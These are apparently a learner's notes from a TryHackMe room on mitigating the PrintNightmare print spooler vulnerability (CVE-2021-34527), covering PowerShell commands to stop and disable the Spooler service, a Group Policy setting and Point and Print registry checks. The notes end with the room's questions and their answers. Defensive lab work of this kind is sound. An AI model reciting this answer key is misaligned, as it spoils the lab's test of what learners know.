https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527

Microsoft provided the steps to detect if Print Spooler service is enabled and how to disable them:

First, you need to determine if the Print Spooler service is running.

Run the following in Windows PowerShell (Run as administrator):

Get-Service -Name Spooler

If Print Spooler is running or if the service is not set to disabled, then select one of the options below to either disable the Print Spooler service or to Disable inbound remote printing through Group Policy.

Option 1)  Disable the Print Spooler service:

If disabling the Print Spooler service is appropriate for your environment, use the following PowerShell commands:

Stop-Service -Name Spooler -Force

Set-Service -Name Spooler -StartupType Disabled

NOTE: By disabling the Print Spooler service, you remove the ability to print locally and remotely.

Option 2)  Disable inbound remote printing through Group Policy:

The settings via Group Policy can be configured as follows:

Computer Configuration / Administrative Templates / Printers

Disable the “Allow Print Spooler to accept client connections” policy to block remote attacks.

This policy will block the remote attack vector by preventing inbound remote printing operations. The system will no longer operate as a print server, but local printing to a directly attached device will still work.

Note: Remember that for the group policy to take effect across the domain, or even the local machine, you need to issue a gpupdate /force command.

For more information, see: Use Group Policy settings to control printers.

https://docs.microsoft.com/en-us/troubleshoot/windows-server/printing/use-group-policy-to-control-ad-printer

The [security update](https://docs.microsoft.com/en-us/troubleshoot/windows-server/printing/use-group-policy-to-control-ad-printer) for Windows Server 2012, Windows Server 2016, and Windows 10, Version 1607 have been released by Microsoft on July 7, 2021. 

Additional steps for mitigation besides installing the updates recommended by Microsoft:

You must confirm that the following registry settings are set to 0 (zero) or are not defined (Note: The mentioned below registry keys do not exist by default, and therefore are already at the secure setting.), also check that your Group Policy settings are correct (see [FAQ](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527)):

		HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint

NoWarningNoElevationOnInstall = 0 (DWORD) or not defined (default setting)

UpdatePromptSettings = 0 (DWORD) or not defined (default setting)

Note: Having NoWarningNoElevationOnInstall set to 1 makes your system vulnerable by design.


Provide two ways to manually disable the Print Spooler Service. (format: answer,answer)
*powershell, group policy*

![[Pasted image 20221115185812.png]]

Where can you disable the Print Spooler Service in Group Policy? (format: no spaces between the forward slashes)
*Computer Configuration/Administrative Templates/Printers*



Provide the command in PowerShell to detect if Print Spooler Service is enabled and running.

```
PS C:\Users\User> Get-Service -Name Spooler

Status   Name               DisplayName
------   ----               -----------
Running  Spooler            Print Spooler
```
*Get-Service -Name Spooler*

###  Conclusion 

![|333](https://i.ibb.co/sFVbzp5/The-End-doodle-drawing-by-hand-on-white-paper.jpg)

Congratulations! You have reached the final chapter of this room and saved THMdepartment from the "horrors" of PrintNightmare.

We really hope you enjoyed it and learned some useful defense techniques in order to prevent and respond to the PrintNightmare attack in a timely manner. 

Here are some additional resources for you to learn more about PrintNightmare detections: 

    PrintNightmare Network Analysis | JUMPSEC LABS https://labs.jumpsec.com/printnightmare-network-analysis/
    From Lares Labs: Detection & Remediation Information for CVE-2021-1675 & CVE-2021-34527 https://github.com/LaresLLC/CVE-2021-1675
    PrintNightmare (CVE-2021-1675 and CVE 2021-34527) Explained https://www.blumira.com/cve-2021-1675/



[[Follina MSDT]]